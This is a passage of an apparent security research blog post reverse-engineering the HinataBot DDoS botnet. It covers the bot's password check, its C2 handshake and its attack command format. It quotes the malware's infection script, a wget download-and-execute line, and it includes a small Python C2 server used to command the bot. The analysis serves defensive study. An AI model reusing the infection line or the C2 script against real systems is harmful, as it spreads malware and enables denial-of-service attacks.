    <p>During our analysis, several functions immediately stood out as noteworthy. Three distinct attack functions caught our eye immediately: <i>sym.main.startAttack</i>, <i>sym.main.http_flood</i>, and <i>sym.main.udp_flood</i> (Figure 14). The naming of these functions suggests that the malware was intended for launching DDoS attacks.</p>

    <p>Further analysis of the malware uncovered references to the C2 communications, which provided additional hints that HinataBot was part of a DDoS-oriented botnet-building campaign (Figure 15). </p>

<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-b2941ca0ad&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:25:56Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>Mapping the C2 communications&lt;/h2>\r\n&#34;}}">
    <h2>Mapping the C2 communications</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-d212e1e8c8&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:26:20Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>To understand how the HinataBot malware establishes a connection to its C2, we worked backward from the string &amp;quot;Connection to CNC is OK!&amp;quot; and began searching for cross-references to the string (Figure 16). This process enabled us to map out the mechanism by which the malware communicates with its C2.&lt;/p>\r\n&#34;}}">
    <p>To understand how the HinataBot malware establishes a connection to its C2, we worked backward from the string &quot;Connection to CNC is OK!&quot; and began searching for cross-references to the string (Figure 16). This process enabled us to map out the mechanism by which the malware communicates with its C2.</p>

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-e29e5f35b0&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:30:33Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Another discovery from looking through the assembly code was the references to an API used for connections (“API_CONNECTION_ATTACK”), as well as numerous possible commands to issue back to the infected device that we were eager to try out (Figure 18).&lt;/p>\r\n&#34;}}">
    <p>Another discovery from looking through the assembly code was the references to an API used for connections (“API_CONNECTION_ATTACK”), as well as numerous possible commands to issue back to the infected device that we were eager to try out (Figure 18).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="Another discovery from looking through the assembly code was the references to an API used for connections (“API_CONNECTION_ATTACK”), as well as numerous possible commands to issue back to the infected device that we were eager to try out (Figure 18)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-7a9e28ec57&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:22:03Z&#34;,&#34;dc:title&#34;:&#34;Another discovery from looking through the assembly code was the references to an API used for connections (“API_CONNECTION_ATTACK”), as well as numerous possible commands to issue back to the infected device that we were eager to try out (Figure 18).&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/first-reference-to-an-api.jpg&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;4e8116a5-f138-49fc-92d6-b6b356651cee&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:12:28Z&#34;,&#34;@type&#34;:&#34;image/jpeg&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/first-reference-to-an-api.jpg&#34;}}}">

      </a>
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 18: First reference to an API</span>

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-a345cca079&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T15:36:14Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>At this point we were confident that the sample we had would connect back to the distribution/C2 server to notify the C2 that the bot is up and running and await commands, but the C2 server was now offline.&amp;nbsp;&lt;/p>\r\n&lt;p>One interesting observation is that HinataBot also opens up a listening port of its own on TCP/61420 (Figure 19). As our primary goal of this research was to better understand the attack traffic this botnet can generate, we didn’t spend much time delving into this capability as it seemed out of scope.&amp;nbsp;&lt;/p>\r\n&lt;p>We did, however, note that the timing differences of this listener are dependent on successful connectivity to the C2. In instances when a C2 is successfully contacted, this listener will die after three minutes. In cases where the C2 could not be reached, this port remains listening with no apparent time limit. Additional research will need to be conducted on this port to fully understand what capabilities it enables for the operators; for example, whether it is some kind of peer-to-peer functionality or possibly an update/control/recovery capability. We can not provide a definitive answer at the time of this writing.&lt;/p>\r\n&#34;}}">
    <p>At this point we were confident that the sample we had would connect back to the distribution/C2 server to notify the C2 that the bot is up and running and await commands, but the C2 server was now offline. </p>
<p>One interesting observation is that HinataBot also opens up a listening port of its own on TCP/61420 (Figure 19). As our primary goal of this research was to better understand the attack traffic this botnet can generate, we didn’t spend much time delving into this capability as it seemed out of scope. </p>
<p>We did, however, note that the timing differences of this listener are dependent on successful connectivity to the C2. In instances when a C2 is successfully contacted, this listener will die after three minutes. In cases where the C2 could not be reached, this port remains listening with no apparent time limit. Additional research will need to be conducted on this port to fully understand what capabilities it enables for the operators; for example, whether it is some kind of peer-to-peer functionality or possibly an update/control/recovery capability. We can not provide a definitive answer at the time of this writing.</p>

</div>

    

</div>

<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-787c334858&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:56:12Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>Talking to HinataBot&lt;/h2>\r\n&#34;}}">
    <h2>Talking to HinataBot</h2>

</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-223719b26e&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T16:59:28Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>In the next phase of our investigation, we deliberately infected several machines and created a C2 server to analyze HinataBot&#39;s interactions, security measures, and traffic patterns. We’ll briefly cover some of the processes and observations made during the reversing of HinataBot.&lt;/p>\r\n&#34;}}">
    <p>In the next phase of our investigation, we deliberately infected several machines and created a C2 server to analyze HinataBot's interactions, security measures, and traffic patterns. We’ll briefly cover some of the processes and observations made during the reversing of HinataBot.</p>

</div>

    

</div>
<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" id="hinata" class="cmp-text" data-cmp-data-layer="{&#34;hinata&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T19:29:59Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h3>HINATA_START_NICE&lt;/h3>\r\n&#34;}}">
    <h3>HINATA_START_NICE</h3>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-2b391508b6&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:00:05Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>As noted earlier, the newer HinataBot sample included some basic security measures that were absent in previous versions. The first such measure was a password requirement. Upon executing the sample, the first thing that one notices is an uncaught exception. The resulting error message makes this pretty clear (Figure 20).&amp;nbsp;&lt;/p>\r\n&#34;}}">
    <p>As noted earlier, the newer HinataBot sample included some basic security measures that were absent in previous versions. The first such measure was a password requirement. Upon executing the sample, the first thing that one notices is an uncaught exception. The resulting error message makes this pretty clear (Figure 20). </p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="The resulting error message makes this pretty clear (Figure 20). " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-dfd7e61201&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T21:19:12Z&#34;,&#34;dc:title&#34;:&#34;The resulting error message makes this pretty clear (Figure 20).&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/figure20.png&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;932fe26e-a10a-48be-b6a5-46db3be79e2c&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:01:12Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/figure20.png&#34;}}}">
    
      <a class="cmp-image__link" href="/site/en/images/blog/2023/figure20.png" target="_blank" rel="nofollow noreferrer" data-cmp-hook-image="link">
        
          <img src="/site/en/images/blog/2023/figure20.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="The resulting error message makes this pretty clear (Figure 20). "/>
        
        
      </a>
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 20: HinataBot requires a password to run</span>
    
    
  </div>
</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-b38a2dabde&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:01:46Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Upon closer examination of the error message, we discovered that the sample required an additional argument to be passed at execution. While passing literally anything into this argument will get you past the uncaught exception, HinataBot will just exit gracefully. From here, it became obvious we needed to go back to the disassembly to see what HinataBot might be looking for in this argument.&lt;/p>\r\n&#34;}}">
    <p>Upon closer examination of the error message, we discovered that the sample required an additional argument to be passed at execution. While passing literally anything into this argument will get you past the uncaught exception, HinataBot will just exit gracefully. From here, it became obvious we needed to go back to the disassembly to see what HinataBot might be looking for in this argument.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="From here, it became obvious we needed to go back to the disassembly to see what HinataBot might be looking for in this argument." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-bda5190d5e&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T21:19:41Z&#34;,&#34;dc:title&#34;:&#34;From here, it became obvious we needed to go back to the disassembly to see what HinataBot might be looking for in this argument.&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/figure21.png&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;035e3b2a-2d5b-4f54-8119-ec60099f9db5&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:24:37Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/figure21.png&#34;}}}">
    
      <a class="cmp-image__link" href="/site/en/images/blog/2023/figure21.png" target="_blank" rel="nofollow noreferrer" data-cmp-hook-image="link">
        
          <img src="/site/en/images/blog/2023/figure21.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="From here, it became obvious we needed to go back to the disassembly to see what HinataBot might be looking for in this argument."/>
        
        
      </a>
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 21: Password checking in HinataBot at run time</span>
    
    
  </div>
</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-3e681da65c&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:31:59Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>We searched through the malware sample and eventually identified the 17-character (&lt;i>0x005fe3d2&lt;/i>) string &amp;quot;HINATA_START_NICE&amp;quot; (&lt;i>0x005fe3d8&lt;/i>) used in a &lt;i>sym.runtime.memequal&lt;/i> call (&lt;i>0x005fe3e0&lt;/i>) that would fail and cause the malware to flow through to a ret instruction, killing the execution (Figure 21). We used this string as an argument when running the sample, which allowed execution to progress into more interesting code.&lt;/p>\r\n&lt;p>Interestingly, the Naruto anime character named Hinata starts out as a peaceful and gentle character before becoming a fierce fighter, something the malware authors may be alluding to when using the &amp;quot;HINATA_START_NICE&amp;quot; argument, before the malware will communicate back to its C2 and participate in launching attacks.&lt;/p>\r\n&lt;p>It is worth noting that this password requirement was not present in the older HinataBot malware samples from January 2023; therefore most of the infection scripts we encountered did not include this argument. However, upon closer review after discovering this requirement we were able to track down their newer infection scripts (Figure 22), which did pass the argument to the binaries at time of infection. This would have been handy to know &lt;i>beforehand&lt;/i>.&lt;/p>\r\n&#34;}}">
    <p>We searched through the malware sample and eventually identified the 17-character (<i>0x005fe3d2</i>) string &quot;HINATA_START_NICE&quot; (<i>0x005fe3d8</i>) used in a <i>sym.runtime.memequal</i> call (<i>0x005fe3e0</i>) that would fail and cause the malware to flow through to a ret instruction, killing the execution (Figure 21). We used this string as an argument when running the sample, which allowed execution to progress into more interesting code.</p>
<p>Interestingly, the Naruto anime character named Hinata starts out as a peaceful and gentle character before becoming a fierce fighter, something the malware authors may be alluding to when using the &quot;HINATA_START_NICE&quot; argument, before the malware will communicate back to its C2 and participate in launching attacks.</p>
<p>It is worth noting that this password requirement was not present in the older HinataBot malware samples from January 2023; therefore most of the infection scripts we encountered did not include this argument. However, upon closer review after discovering this requirement we were able to track down their newer infection scripts (Figure 22), which did pass the argument to the binaries at time of infection. This would have been handy to know <i>beforehand</i>.</p>

</div>

    

</div>

cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://xxx.xxx.xxx.xxx/bins/hinata-android-386; chmod +x hinata-android-386; ./hinata-android-386 HINATA_START_NICE; rm -rf hinata-android-386;
cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://xxx.xxx.xxx.xxx/bins/hinata-android-amd64; chmod +x hinata-android-amd64; ./hinata-android-amd64 HINATA_START_NICE; rm -rf hinata-android-amd64;</code>

    <p>Fig. 22: New infection script using the password</p>

<div class="text text__pt-20 text__pb-none aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-85945998f9&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:27:01Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h3>Go.123+Strings-456.Are_789-Weird&lt;/h3>\r\n&#34;}}">
    <h3>Go.123+Strings-456.Are_789-Weird</h3>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-5bacd0da51&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:28:16Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Our analysis of the HinataBot sample revealed a large number of very long plaintext strings embedded within the binary. Go utilizes a unique approach in storing string literals by placing them in a contiguous block of memory known as a &amp;quot;string table&amp;quot; or &amp;quot;string intern pool.&amp;quot;&amp;nbsp;&lt;/p>\r\n&lt;p>As a result, when running the strings command or disassemblers on a Go binary, the output may appear as a confusing jumble of characters, making it difficult to distinguish between individual strings in the table (Figure 23).&lt;/p>\r\n&#34;}}">
    <p>Our analysis of the HinataBot sample revealed a large number of very long plaintext strings embedded within the binary. Go utilizes a unique approach in storing string literals by placing them in a contiguous block of memory known as a &quot;string table&quot; or &quot;string intern pool.&quot; </p>
<p>As a result, when running the strings command or disassemblers on a Go binary, the output may appear as a confusing jumble of characters, making it difficult to distinguish between individual strings in the table (Figure 23).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">
  <div data-cmp-lazy data-title="As a result, when running the strings command or disassemblers on a Go binary, the output may appear as a confusing jumble of characters, making it difficult to distinguish between individual strings in the table (Figure 23). " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-701dd23a62&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T21:26:17Z&#34;,&#34;dc:title&#34;:&#34;As a result, when running the strings command or disassemblers on a Go binary, the output may appear as a confusing jumble of characters, making it difficult to distinguish between individual strings in the table (Figure 23).&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/figure23.png&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;7dcae42a-d384-4f25-9379-229038081361&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:29:49Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/figure23.png&#34;}}}">
    
      <a class="cmp-image__link" href="/site/en/images/blog/2023/figure23.png" target="_blank" rel="nofollow noreferrer" data-cmp-hook-image="link">
        
          <img src="/site/en/images/blog/2023/figure23.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="As a result, when running the strings command or disassemblers on a Go binary, the output may appear as a confusing jumble of characters, making it difficult to distinguish between individual strings in the table (Figure 23). "/>
        
        
      </a>
    
    

    <span class="cmp-image__title" itemprop="caption">Fig. 23: An example Go string, with instances of “API_CONNECTION” highlighted</span>
    
    
  </div>
</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-5c2b0f36be&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T17:32:30Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>This technique differs from other programming languages, which typically store null-terminated byte strings. Without these trailing null bytes, tooling continues reading a discovered string until it encounters a null byte. This makes a simple analysis of strings a touch more challenging.  &lt;/p>\r\n&lt;p>Looking at cross-references from code segments into the string table address segments can help identify where individual strings in the larger table begin. Typically, you can also identify their length being loaded into a register before or after the string is loaded or as part of a function call that will utilize the string slice being referenced (Figure 24). It takes some getting used to, but it’s pretty straightforward once you get comfortable with the convention.&lt;/p>\r\n&#34;}}">
    <p>This technique differs from other programming languages, which typically store null-terminated byte strings. Without these trailing null bytes, tooling continues reading a discovered string until it encounters a null byte. This makes a simple analysis of strings a touch more challenging.  </p>
<p>Looking at cross-references from code segments into the string table address segments can help identify where individual strings in the larger table begin. Typically, you can also identify their length being loaded into a register before or after the string is loaded or as part of a function call that will utilize the string slice being referenced (Figure 24). It takes some getting used to, but it’s pretty straightforward once you get comfortable with the convention.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper    ">

<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-88ff7f8cb9&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:24:45Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h3>Talk to me, Goose&lt;/h3>\r\n&#34;}}">
    <h3>Talk to me, Goose</h3>

</div>

    

</div>
<div class="text text__pt-none text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-8002bd5b29&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:32:32Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>With a means of satisfying the password requirement in place, our attention turned to establishing a connection to the C2 server. In a similar manner to how we discovered the password, we were able to identify the necessary components of the handshake protocol required to establish a connection to the C2 server, which was down at the time of this research/writing.&amp;nbsp;&lt;/p>\r\n&lt;p>Using &lt;i>netcat&lt;/i> to listen on port 1420, we then patched the binary to use an IP we controlled as the C2 server. Once connected, we then sent the proper triggers to the infected device, staging it for attack participation (Figure 25).&amp;nbsp;&lt;/p>\r\n&#34;}}">
    <p>With a means of satisfying the password requirement in place, our attention turned to establishing a connection to the C2 server. In a similar manner to how we discovered the password, we were able to identify the necessary components of the handshake protocol required to establish a connection to the C2 server, which was down at the time of this research/writing. </p>
<p>Using <i>netcat</i> to listen on port 1420, we then patched the binary to use an IP we controlled as the C2 server. Once connected, we then sent the proper triggers to the infected device, staging it for attack participation (Figure 25). </p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">

  <div data-cmp-lazy data-title="Using netcat to listen on port 1420, we then patched the binary to use an IP we controlled as the C2 server. <div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-d8be4d4324&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T16:33:22Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The handshake consisted of an initial connection, followed by the bot sending an “&lt;i>API_CONNECTION_BOT [os]/[architecture] [hostname]&lt;/i>“ message. The bot then expects a &lt;i>API_CONNECTION_SIGNAL_OK&lt;/i> message back from the C2 server, which would stage the bot to listen for incoming commands (Figure 26). With the handshake out of the way, we send the &lt;i>API_CONNECTION_ATTACK: &lt;/i>signal to initiate attacks.&amp;nbsp;&lt;/p>\r\n&#34;}}">
    <p>The handshake consisted of an initial connection, followed by the bot sending an “<i>API_CONNECTION_BOT [os]/[architecture] [hostname]</i>“ message. The bot then expects a <i>API_CONNECTION_SIGNAL_OK</i> message back from the C2 server, which would stage the bot to listen for incoming commands (Figure 26). With the handshake out of the way, we send the <i>API_CONNECTION_ATTACK: </i>signal to initiate attacks. </p>

</div>

<div class="image aem-GridColumn aem-GridColumn--default--12">

  <div data-cmp-lazy data-title="The bot then expects a API_CONNECTION_SIGNAL_OK message back from the C2 server, which would stage the bot to listen for incoming commands (Figure 26)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-efeb394d07&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:22:57Z&#34;,&#34;dc:title&#34;:&#34;The bot then expects a API_CONNECTION_SIGNAL_OK message back from the C2 server, which would stage the bot to listen for incoming commands (Figure 26).&#34;,&#34;xdm:linkURL&#34;:&#34;/site/en/images/blog/2023/sample-hinata-bot.jpg&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;26f06db3-edec-45d7-92c8-831cd6bedb1f&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-16T13:13:46Z&#34;,&#34;@type&#34;:&#34;image/jpeg&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2023/sample-hinata-bot.jpg&#34;}}}">

<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-036f1ca5dc&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:30:30Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>We created a very simple C2 server in order to automate the maintenance of this connection and allow us to modify and send a command stored in a text file without needing to modify code, which allowed for very easy and rapid testing (Figure 27). This saved us quite a bit of time over the course of this research.&lt;/p>\r\n&#34;}}">
    <p>We created a very simple C2 server in order to automate the maintenance of this connection and allow us to modify and send a command stored in a text file without needing to modify code, which allowed for very easy and rapid testing (Figure 27). This saved us quite a bit of time over the course of this research.</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-21695d339a&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:31:15Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">#!/usr/bin/env python
from pwn import *
import time
l = listen(1420)
l.wait_for_connection()
time.sleep(1)
l.send(b&#39;API_CONNECTION_SIGNAL_OK&#39;)
while True:
    data = l.recv()
    if data: 
        print(time.time(), data)
        if data == b&#39;API_CONNECTION_SIGNAL_CHECK&#39;:
            continue
    else:
        print(time.time(), &#39;no data recv\&#39;d&#39;)
    cmdf = open(&#39;cmd.txt&#39;,&#39;r&#39;)
    cmdt = cmdf.read()
    cmdf.close()
    if cmdt == &#34;&#34;:
        cmdt = b&#39;API_CONNECTION_SIGNAL_OK&#39;
    print(time.time(), &#39;SENT:&#39;, cmdt)
    l.send(cmdt)</code>
</pre>

<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-cee3c5b89c&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:32:07Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Although these interactions with HinataBot were interesting enough, our ultimate goal was always to observe the malware in action, and to see what its attack traffic looked like on the wire when directed at targeted systems. With the basic C2 communications set up, we now began to delve into the attack command, processing logic and mapping out the attack command structures.&lt;/p>\r\n&#34;}}">
    <p>Although these interactions with HinataBot were interesting enough, our ultimate goal was always to observe the malware in action, and to see what its attack traffic looked like on the wire when directed at targeted systems. With the basic C2 communications set up, we now began to delve into the attack command, processing logic and mapping out the attack command structures.</p>

</div>

<div class="text text__pt-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-3fe2ff500a&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:32:36Z&#34;,&#34;xdm:text&#34;:&#34;&lt;h2>HinataBot stops being nice&lt;/h2>\r\n&#34;}}">
    <h2>HinataBot stops being nice</h2>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-6dc7cdb32e&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:33:16Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The newest version of this malware has two primary attack methods: HTTP and UDP. The older version contained these two, as well as attack methods leveraging ICMP and TCP floods. It is unclear why these methods were removed.&lt;/p>\r\n&lt;p>To get a closer look at the actual attack traffic, we used our makeshift C2 server to maintain the connection as the bot sent heartbeats to us. This way, we could focus just on the attack commands, and not have to worry about maintaining a connection to the infected device.&lt;/p>\r\n&lt;p>After extensive analysis and testing, we were finally able to map out the structure and fields needed to start launching attacks and begin capturing packets on the wire. The malware author leverages multiple Go conventions like anonymous functions, goroutines, channels, worker pools, and wait groups, making reversing a bit more tricky. Ultimately, after quite a bit of testing, we’d figured out the attack command structure (Figure 28).&lt;/p>\r\n&#34;}}">
    <p>The newest version of this malware has two primary attack methods: HTTP and UDP. The older version contained these two, as well as attack methods leveraging ICMP and TCP floods. It is unclear why these methods were removed.</p>
<p>To get a closer look at the actual attack traffic, we used our makeshift C2 server to maintain the connection as the bot sent heartbeats to us. This way, we could focus just on the attack commands, and not have to worry about maintaining a connection to the infected device.</p>
<p>After extensive analysis and testing, we were finally able to map out the structure and fields needed to start launching attacks and begin capturing packets on the wire. The malware author leverages multiple Go conventions like anonymous functions, goroutines, channels, worker pools, and wait groups, making reversing a bit more tricky. Ultimately, after quite a bit of testing, we’d figured out the attack command structure (Figure 28).</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-926be44627&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T18:33:42Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">API_CONNECTION_ATTACK: [ATTACK_TYPE] [TARGET] [DURATION] [UDP_OPTIONS]</code>
</pre>
<button data-cmp-hook-prismjs="copy" class="cmp-prismjs__copy">Copy</button>


    

</div>
<div class="text text__pt-none text__pb-none aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-409ce555b8&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2023-03-15T20:22:18Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Fig. 28: Attack command structure&lt;/p>\r\n&#34;}}">
    <p>Fig. 28: Attack command structure</p>

</div>

    

</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
